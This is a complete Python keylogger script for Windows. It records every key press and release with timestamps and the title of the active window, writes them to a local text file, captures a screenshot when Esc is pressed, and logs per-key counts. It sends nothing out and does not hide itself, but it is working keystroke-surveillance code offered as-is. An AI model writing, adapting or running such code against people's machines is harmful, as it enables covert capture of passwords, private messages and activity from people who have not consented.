import logging
import time
from pynput import keyboard
from datetime import datetime
import win32gui
import win32process
from PIL import ImageGrab

# Configure logging
file_log = 'keyloggeroutput.txt'
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')


# Function to get the active window
def get_active_window():
    hwnd = win32gui.GetForegroundWindow()
    window_text = win32gui.GetWindowText(hwnd)
    return window_text


# Function to take screenshots
def take_screenshot():
    img = ImageGrab.grab()
    img.save(f'screenshot_{int(time.time())}.png')


# Key mapping for better readability
key_mapping = {
    keyboard.Key.space: 'SPACE',
    keyboard.Key.enter: 'ENTER',
    keyboard.Key.tab: 'TAB',
    keyboard.Key.esc: 'ESC',
    # Add more mappings as needed
}

# Track last logged key and counts
last_key = None
key_count = {}
session_logs = []


def clear_log_file():
    with open(file_log, 'w') as log_file:
        log_file.write("")  # Clear the contents


def on_press(key):
    global last_key
    window_name = get_active_window()
    key_name = key_mapping.get(key, key.char if hasattr(key, 'char') else str(key))

    # Check for clear command
    if key_name == '#':
        clear_log_file()
        logging.log(10, f'{datetime.now()}: Log file cleared.')
        return  # Don't log this key press

    # Filter redundant entries
    if key_name != last_key:
        log_entry = f'{datetime.now()}: [{window_name}] Key {key_name} pressed.'
        logging.log(10, log_entry)
        session_logs.append(log_entry)
        last_key = key_name

        # Count unique key presses
        key_count[key_name] = key_count.get(key_name, 0) + 1


def on_release(key):
    global last_key
    window_name = get_active_window()
    key_name = key_mapping.get(key, key.char if hasattr(key, 'char') else str(key))

    log_entry = f'{datetime.now()}: [{window_name}] Key {key_name} released.'
    logging.log(10, log_entry)
    session_logs.append(log_entry)

    if key == keyboard.Key.esc:
        take_screenshot()
        return False  # Stop listener


try:
    # Start the key logger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
finally:
    # Log summary at the end of the session
    with open(file_log, 'a') as log_file:
        log_file.write("\n=== Session Summary ===\n")
        for key, count in key_count.items():
            log_file.write(f'Key: {key}, Count: {count}\n')
